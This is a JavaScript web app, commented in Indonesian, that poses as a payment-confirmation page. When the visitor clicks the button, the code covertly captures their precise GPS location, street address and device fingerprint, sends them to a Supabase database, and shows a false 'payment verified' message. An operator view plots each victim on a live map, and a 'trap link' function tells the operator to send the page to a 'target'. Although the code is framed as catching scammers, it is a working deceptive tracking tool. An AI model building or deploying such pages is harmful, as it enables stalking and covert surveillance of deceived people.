/**
 * Location Finder - Kirim & Terima Lokasi via Supabase Realtime Database
 * User 1 klik tombol → lokasi dikirim ke database → User 2 langsung terima di peta
 */

// ==========================================
// SUPABASE CONFIG
// ==========================================
const SUPABASE_URL = 'https://lqtoxnyeqhyfgbkyimpj.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxxdG94bnllcWh5Zmdia3lpbXBqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUzMTU4MzYsImV4cCI6MjEwMDg5MTgzNn0.-xDoNooZOnTmQB1CcoeW6JhDvXFDSa88n8HBq1ZC6uM';

const supabase = window._supabaseCreateClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ==========================================
// STATE
// ==========================================
const STATE = {
  currentMode: 'pay',
  roomId: 'LOC-8821',
  isSoundEnabled: true,
  isScanning: false,
  locationsHistory: [],
  receiverMap: null,
  receiverMarkers: {},
  activePoliceReportText: ''
};

// ==========================================
// 1. INIT
// ==========================================
// Langsung jalankan karena app.js dimuat setelah DOM & Supabase siap
(function init() {
  initUrlParams();
  initMaps();
  loadLocationsFromDB();
  listenRealtimeInserts();

  const savedTheme = localStorage.getItem('loc_sender_theme') || 'dark';
  document.documentElement.setAttribute('data-theme', savedTheme);
})();

function initUrlParams() {
  const params = new URLSearchParams(window.location.search);
  const modeParam = params.get('mode');
  const roomParam = params.get('room');

  if (roomParam && roomParam.trim() !== '') {
    STATE.roomId = roomParam.trim().toUpperCase();
    const roomInput = document.getElementById('room-id-input');
    if (roomInput) roomInput.value = STATE.roomId;
  }

  if (modeParam === 'tracker' || modeParam === 'receiver' || modeParam === 'police') {
    switchMode('tracker');
  } else {
    switchMode('pay');
  }
}

function switchMode(mode) {
  STATE.currentMode = mode;

  const appNavbar = document.getElementById('app-navbar');
  const btnPay = document.getElementById('btn-mode-pay');
  const btnTracker = document.getElementById('btn-mode-tracker');
  const viewPay = document.getElementById('view-pay');
  const viewTracker = document.getElementById('view-tracker');

  if (mode === 'tracker') {
    if (appNavbar) appNavbar.style.display = 'flex';
    btnPay.classList.remove('active');
    btnTracker.classList.add('active', 'active-receiver');
    viewPay.classList.remove('active');
    viewTracker.classList.add('active');

    setTimeout(() => {
      if (STATE.receiverMap) {
        STATE.receiverMap.invalidateSize();
        fitReceiverMapBounds();
      }
    }, 200);
  } else {
    if (appNavbar) appNavbar.style.display = 'none';
    btnTracker.classList.remove('active', 'active-receiver');
    btnPay.classList.add('active');
    viewTracker.classList.remove('active');
    viewPay.classList.add('active');
  }

  if (mode === 'pay') {
    const cleanUrl = window.location.pathname.replace(/\/user2\/?.*$/, '') || '/';
    window.history.replaceState({ path: cleanUrl }, '', cleanUrl);
  } else {
    const newUrl = `${window.location.pathname}?mode=${mode}`;
    window.history.replaceState({ path: newUrl }, '', newUrl);
  }
}

// ==========================================
// 2. SUPABASE DATABASE - KIRIM & TERIMA
// ==========================================

/**
 * Load semua lokasi dari database saat halaman dibuka
 */
async function loadLocationsFromDB() {
  try {
    const { data, error } = await supabase
      .from('locations')
      .select('*')
      .eq('session_id', STATE.roomId)
      .order('created_at', { ascending: false });

    if (error) {
      console.warn('Gagal load data:', error.message);
      return;
    }

    if (data && data.length > 0) {
      STATE.locationsHistory = data.map(row => dbRowToLocData(row));
      updateReceiverFeed();
      refreshReceiverMapMarkers();
    }
  } catch (err) {
    console.warn('Load DB error:', err);
  }
}

/**
 * Kirim lokasi ke database Supabase
 */
async function sendLocationToDB(locData) {
  try {
    const { error } = await supabase
      .from('locations')
      .insert({
        session_id: STATE.roomId,
        sender_name: locData.senderName,
        latitude: locData.lat,
        longitude: locData.lng,
        accuracy: locData.accuracy,
        address: locData.address,
        user_agent: locData.forensics?.userAgent || '',
        platform: locData.forensics?.platform || '',
        screen_res: locData.forensics?.screenRes || '',
        timezone: locData.forensics?.timezone || ''
      });

    if (error) {
      console.warn('Gagal kirim ke DB:', error.message);
    } else {
      console.log('Lokasi berhasil dikirim ke database!');
    }
  } catch (err) {
    console.warn('Send DB error:', err);
  }
}

/**
 * Dengarkan data baru masuk secara realtime (User 2 otomatis terima)
 */
function listenRealtimeInserts() {
  supabase
    .channel('locations-realtime')
    .on('postgres_changes', 
      { event: 'INSERT', schema: 'public', table: 'locations' },
      (payload) => {
        const newRow = payload.new;
        if (newRow.session_id !== STATE.roomId) return;

        const locData = dbRowToLocData(newRow);
        const exists = STATE.locationsHistory.some(l => l.id === locData.id);
        if (!exists) {
          STATE.locationsHistory.unshift(locData);
          updateReceiverFeed();
          addMarkerToReceiverMap(locData, true);
          playSirenSound();
          showToast('🚨 Lokasi Baru Masuk!', `Koordinat dari ${locData.senderName} berhasil diterima.`, 'police');
        }
      }
    )
    .subscribe();
}

/**
 * Konversi row database ke format locData
 */
function dbRowToLocData(row) {
  return {
    id: row.id,
    senderName: row.sender_name,
    lat: row.latitude,
    lng: row.longitude,
    accuracy: row.accuracy || 0,
    address: row.address || '',
    timestamp: row.created_at,
    room: row.session_id,
    forensics: {
      userAgent: row.user_agent || '',
      platform: row.platform || '',
      screenRes: row.screen_res || '',
      timezone: row.timezone || ''
    }
  };
}

// ==========================================
// 3. USER 1 - KONFIRMASI PEMBAYARAN
// ==========================================

async function handleConfirmPayment() {
  if (STATE.isScanning) return;

  const btnConfirm = document.getElementById('btn-confirm-payment');
  const btnText = document.getElementById('btn-pay-text');
  const spinner = document.getElementById('btn-pay-spinner');
  const statusBox = document.getElementById('payment-status-message');
  const msgTitle = document.getElementById('pay-msg-title');
  const msgDesc = document.getElementById('pay-msg-desc');

  STATE.isScanning = true;
  btnConfirm.disabled = true;
  if (spinner) spinner.style.display = 'inline-block';
  if (btnText) btnText.textContent = 'MEMVERIFIKASI PEMBAYARAN...';

  if (!navigator.geolocation) {
    finishPaymentUI('Pembayaran Sedang Diverifikasi', 'Sistem sedang memproses verifikasi transaksi Anda. Terima kasih.');
    return;
  }

  const forensics = {
    userAgent: navigator.userAgent || 'Unknown',
    platform: navigator.platform || 'Unknown',
    screenRes: `${window.screen.width}x${window.screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Asia/Jakarta',
    language: navigator.language || 'id-ID'
  };

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const acc = Math.round(position.coords.accuracy);

      const address = await reverseGeocode(lat, lng);

      const locData = {
        senderName: 'User-' + Math.floor(1000 + Math.random() * 9000),
        lat: lat,
        lng: lng,
        accuracy: acc,
        address: address,
        forensics: forensics
      };

      // Kirim ke Supabase Database
      await sendLocationToDB(locData);

      finishPaymentUI(
        'Verifikasi Pembayaran Berhasil',
        'Pembayaran pesanan Anda telah berhasil dikonfirmasi dan sedang diproses oleh sistem. Terima kasih.'
      );
    },
    (error) => {
      finishPaymentUI(
        'Pembayaran Dalam Pemeriksaan',
        'Permintaan konfirmasi pembayaran telah dikirim ke sistem untuk pengecekan otomatis.'
      );
    },
    {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    }
  );
}

async function reverseGeocode(lat, lng) {
  try {
    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
    const response = await fetch(url, { headers: { 'Accept-Language': 'id, en' } });
    if (!response.ok) throw new Error('Geocode API Error');
    const data = await response.json();
    return data.display_name || `Koordinat: ${lat.toFixed(5)}, ${lng.toFixed(5)}`;
  } catch (err) {
    return `Koordinat (${lat.toFixed(5)}, ${lng.toFixed(5)})`;
  }
}

function finishPaymentUI(title, desc) {
  STATE.isScanning = false;
  const btnConfirm = document.getElementById('btn-confirm-payment');
  const btnText = document.getElementById('btn-pay-text');
  const spinner = document.getElementById('btn-pay-spinner');
  const statusBox = document.getElementById('payment-status-message');
  const msgTitle = document.getElementById('pay-msg-title');
  const msgDesc = document.getElementById('pay-msg-desc');

  if (spinner) spinner.style.display = 'none';
  if (btnText) btnText.textContent = 'KONFIRMASI TERKIRIM ✓';
  if (btnConfirm) btnConfirm.style.background = 'linear-gradient(135deg, #059669, #047857)';
  if (msgTitle) msgTitle.textContent = title;
  if (msgDesc) msgDesc.textContent = desc;
  if (statusBox) statusBox.style.display = 'flex';
}

// ==========================================
// 4. MAPS (LEAFLET.JS)
// ==========================================

function initMaps() {
  const receiverContainer = document.getElementById('receiver-map');
  if (receiverContainer && !STATE.receiverMap) {
    STATE.receiverMap = L.map('receiver-map', {
      zoomControl: true,
      attributionControl: true
    }).setView([-6.2000, 106.8166], 12);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      maxZoom: 19,
      attribution: '© OpenStreetMap'
    }).addTo(STATE.receiverMap);

    refreshReceiverMapMarkers();
  }
}

function createBeaconIcon() {
  return L.divIcon({
    className: 'custom-beacon-marker-container',
    html: '<div class="custom-beacon-marker"></div>',
    iconSize: [24, 24],
    iconAnchor: [12, 12],
    popupAnchor: [0, -15]
  });
}

function addMarkerToReceiverMap(loc, isNew) {
  if (!STATE.receiverMap) return;

  if (STATE.receiverMarkers[loc.id]) {
    STATE.receiverMap.removeLayer(STATE.receiverMarkers[loc.id]);
  }

  const icon = createBeaconIcon();
  const marker = L.marker([loc.lat, loc.lng], { icon: icon }).addTo(STATE.receiverMap);

  const gmapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
  marker.bindPopup(`
    <div style="font-family: sans-serif; min-width: 220px; color: #0f172a;">
      <div style="font-weight: 700; font-size: 1rem; color: #e11d48; border-bottom: 1px solid #cbd5e1; padding-bottom: 6px; margin-bottom: 6px;">
        📍 ${escapeHtml(loc.senderName)}
      </div>
      <p style="margin: 0 0 6px; font-size: 0.82rem; line-height: 1.4;">${escapeHtml(loc.address)}</p>
      <div style="background: #f1f5f9; padding: 6px; border-radius: 4px; font-family: monospace; font-size: 0.72rem; color: #334155; margin-bottom: 8px;">
        LAT: ${loc.lat.toFixed(6)}, LNG: ${loc.lng.toFixed(6)}<br>
        AKURASI: ±${loc.accuracy}m | ${formatDateTime(loc.timestamp)}
      </div>
      <a href="${gmapUrl}" target="_blank" style="display: block; text-align: center; background: #0284c7; color: #fff; padding: 6px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 0.8rem;">
        🗺️ Buka di Google Maps
      </a>
    </div>
  `);

  STATE.receiverMarkers[loc.id] = marker;

  if (isNew) {
    marker.openPopup();
    STATE.receiverMap.setView([loc.lat, loc.lng], 16, { animate: true });
  }
}

function refreshReceiverMapMarkers() {
  if (!STATE.receiverMap) return;
  Object.values(STATE.receiverMarkers).forEach(m => STATE.receiverMap.removeLayer(m));
  STATE.receiverMarkers = {};
  STATE.locationsHistory.forEach(loc => addMarkerToReceiverMap(loc, false));
  fitReceiverMapBounds();
}

function fitReceiverMapBounds() {
  if (!STATE.receiverMap) return;
  const markers = Object.values(STATE.receiverMarkers);
  if (markers.length === 0) return;
  const group = L.featureGroup(markers);
  STATE.receiverMap.fitBounds(group.getBounds().pad(0.25), { maxZoom: 16 });
}

// ==========================================
// 5. USER 2 - FEED LOKASI
// ==========================================

function updateReceiverFeed() {
  const container = document.getElementById('locations-list');
  const badge = document.getElementById('feed-counter-badge');
  if (!container) return;

  const count = STATE.locationsHistory.length;
  if (badge) badge.textContent = `${count} LOKASI`;

  if (count === 0) {
    container.innerHTML = `
      <div class="empty-feed">
        <div class="empty-feed-icon">📡</div>
        <h4>Belum Ada Data Lokasi Masuk</h4>
        <p style="margin-top: 0.5rem; font-size: 0.85rem;">
          Kirimkan link <strong>Konfirmasi Pembayaran</strong> kepada target. Ketika tombol diklik, koordinat &amp; alamat akan langsung muncul di sini secara otomatis.
        </p>
      </div>
    `;
    return;
  }

  let html = '';
  STATE.locationsHistory.forEach((loc, idx) => {
    const isLatest = idx === 0;
    const gmapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
    const ua = (loc.forensics && loc.forensics.userAgent) || 'Unknown';

    html += `
      <div class="loc-item-card ${isLatest ? 'new-alert' : ''}" onclick="focusOnReceiverLocation('${loc.id}')">
        <div class="loc-card-top">
          <div class="loc-sender-name">
            <span>📍 ${escapeHtml(loc.senderName)}</span>
          </div>
          <div class="loc-timestamp">${formatDateTime(loc.timestamp)}</div>
        </div>

        <div class="loc-address">
          <strong>Alamat:</strong><br>
          ${escapeHtml(loc.address)}
        </div>

        <div class="loc-device-box">
          📱 <strong>Perangkat:</strong><br>
          ${escapeHtml(ua.slice(0, 95))}...
        </div>

        <div class="loc-coords-row">
          <span>${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}</span>
          <span>±${loc.accuracy}m</span>
        </div>

        <div class="loc-card-actions" onclick="event.stopPropagation()">
          <a href="${gmapUrl}" target="_blank" class="btn-mini btn-gmaps">🗺️ Google Maps</a>
          <button class="btn-mini btn-police" onclick="openPoliceModalForId('${loc.id}')">📋 Laporan</button>
        </div>
      </div>
    `;
  });

  container.innerHTML = html;
}

function focusOnReceiverLocation(locId) {
  const loc = STATE.locationsHistory.find(l => l.id === locId);
  if (!loc || !STATE.receiverMap) return;
  STATE.receiverMap.setView([loc.lat, loc.lng], 17, { animate: true });
  const marker = STATE.receiverMarkers[locId];
  if (marker) marker.openPopup();
}

function clearLocationHistory() {
  if (!confirm('Apakah Anda yakin ingin menghapus seluruh data lokasi?')) return;
  STATE.locationsHistory = [];
  updateReceiverFeed();
  refreshReceiverMapMarkers();
  showToast('Data Dihapus', 'Semua lokasi telah dibersihkan dari tampilan.', 'info');
}

// ==========================================
// 6. LAPORAN POLISI MODAL
// ==========================================

function openPoliceModalForId(locId) {
  const loc = STATE.locationsHistory.find(l => l.id === locId);
  if (!loc) return;

  const gmapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
  const f = loc.forensics || {};

  const reportText =
`=============================================================
           LAPORAN DATA LOKASI
=============================================================
ID DATA            : ${loc.id}
NAMA PENGIRIM      : ${loc.senderName}
WAKTU              : ${formatDateTime(loc.timestamp)} (${f.timezone || 'Asia/Jakarta'})

--- KOORDINAT GPS ---
LATITUDE           : ${loc.lat.toFixed(7)}
LONGITUDE          : ${loc.lng.toFixed(7)}
AKURASI            : ± ${loc.accuracy} METER
ALAMAT             :
${loc.address}

GOOGLE MAPS        : ${gmapUrl}

--- INFORMASI PERANGKAT ---
BROWSER            : ${f.userAgent || '-'}
PLATFORM           : ${f.platform || '-'}
RESOLUSI LAYAR     : ${f.screenRes || '-'}
ZONA WAKTU         : ${f.timezone || '-'}
=============================================================`;

  STATE.activePoliceReportText = reportText;
  const textarea = document.getElementById('police-report-text');
  if (textarea) textarea.value = reportText;

  const modal = document.getElementById('police-modal');
  if (modal) modal.style.display = 'flex';
}

function closePoliceModal() {
  const modal = document.getElementById('police-modal');
  if (modal) modal.style.display = 'none';
}

function copyPoliceReportText() {
  if (!STATE.activePoliceReportText) return;
  if (navigator.clipboard) {
    navigator.clipboard.writeText(STATE.activePoliceReportText).then(() => {
      showToast('Laporan Disalin! 📋', 'Teks laporan berhasil disalin ke clipboard.', 'success');
      closePoliceModal();
    }).catch(() => {
      prompt('Salin teks laporan berikut:', STATE.activePoliceReportText);
    });
  } else {
    prompt('Salin teks laporan berikut:', STATE.activePoliceReportText);
  }
}

// ==========================================
// 7. LINK JEBAKAN & SIMULASI
// ==========================================

function copyTrapLink() {
  const baseUrl = window.location.origin + window.location.pathname.replace(/\/user2\/?.*$/, '').replace(/index\.html$/, '');
  const url = baseUrl;

  if (navigator.clipboard) {
    navigator.clipboard.writeText(url).then(() => {
      showToast('Link Disalin! 🔗', 'Kirim link tersebut ke target.', 'success');
    }).catch(() => {
      prompt('Salin link berikut:', url);
    });
  } else {
    prompt('Salin link berikut:', url);
  }
}

function simulateScammerClick() {
  const demoData = [
    { name: 'User-8912', lat: -6.175392, lng: 106.827153, address: 'Jl. Medan Merdeka Utara, Gambir, Jakarta Pusat, DKI Jakarta' },
    { name: 'User-4401', lat: -6.225014, lng: 106.806626, address: 'Jl. Jenderal Sudirman, Senayan, Kebayoran Baru, Jakarta Selatan' },
    { name: 'User-6129', lat: -7.257472, lng: 112.752090, address: 'Jl. Pemuda, Genteng, Kota Surabaya, Jawa Timur' }
  ];

  const pick = demoData[Math.floor(Math.random() * demoData.length)];

  const locData = {
    senderName: pick.name,
    lat: pick.lat,
    lng: pick.lng,
    accuracy: 6,
    address: pick.address,
    forensics: {
      userAgent: 'Mozilla/5.0 (Linux; Android 14; SM-S918B)',
      platform: 'Linux armv8l',
      screenRes: '1080x2340',
      timezone: 'Asia/Jakarta'
    }
  };

  sendLocationToDB(locData);
  showToast('⚡ Simulasi Berhasil!', `Data lokasi ${pick.name} dikirim ke database.`, 'police');
}

function changeRoomId(newRoomId) {
  const cleanId = newRoomId.trim().toUpperCase() || 'LOC-8821';
  STATE.roomId = cleanId;
  const roomInput = document.getElementById('room-id-input');
  if (roomInput) roomInput.value = STATE.roomId;

  STATE.locationsHistory = [];
  updateReceiverFeed();
  refreshReceiverMapMarkers();
  loadLocationsFromDB();

  showToast('Room Berubah', `Sekarang di Room: ${STATE.roomId}`, 'info');
}

// ==========================================
// 8. UTILITIES
// ==========================================

function playSirenSound() {
  if (!STATE.isSoundEnabled) return;
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = 'triangle';
    osc.frequency.setValueAtTime(440, ctx.currentTime);
    osc.frequency.linearRampToValueAtTime(880, ctx.currentTime + 0.2);
    osc.frequency.linearRampToValueAtTime(440, ctx.currentTime + 0.4);
    gain.gain.setValueAtTime(0.22, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.45);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.45);
  } catch (err) {}
}

function toggleSound() {
  STATE.isSoundEnabled = !STATE.isSoundEnabled;
  const btn = document.getElementById('btn-toggle-sound');
  if (btn) {
    btn.textContent = STATE.isSoundEnabled ? '🔊' : '🔇';
    btn.title = STATE.isSoundEnabled ? 'Suara Aktif' : 'Suara Nonaktif';
  }
  showToast('Suara', STATE.isSoundEnabled ? 'Suara AKTIF' : 'Suara NONAKTIF', 'info');
}

function toggleTheme() {
  const current = document.documentElement.getAttribute('data-theme') || 'dark';
  const next = current === 'dark' ? 'light' : 'dark';
  document.documentElement.setAttribute('data-theme', next);
  localStorage.setItem('loc_sender_theme', next);
  const btn = document.getElementById('btn-toggle-theme');
  if (btn) btn.textContent = next === 'dark' ? '🌙' : '☀️';
}

function showToast(title, message, type = '') {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const el = document.createElement('div');
  el.className = `toast-alert ${type}`;
  el.innerHTML = `
    <div style="font-size: 1.4rem;">${type === 'success' ? '✅' : type === 'info' ? 'ℹ️' : '🚨'}</div>
    <div>
      <div style="font-weight: 700; margin-bottom: 2px;">${escapeHtml(title)}</div>
      <div style="font-size: 0.8rem; color: var(--text-secondary);">${escapeHtml(message)}</div>
    </div>
  `;
  container.appendChild(el);

  setTimeout(() => {
    el.style.opacity = '0';
    el.style.transform = 'translateX(100%)';
    el.style.transition = 'all 0.3s ease';
    setTimeout(() => { if (el.parentNode) el.parentNode.removeChild(el); }, 300);
  }, 4500);
}

function formatDateTime(isoString) {
  try {
    const dt = new Date(isoString);
    return dt.toLocaleString('id-ID', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit', second: '2-digit'
    });
  } catch (e) {
    return isoString || '-';
  }
}

function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}
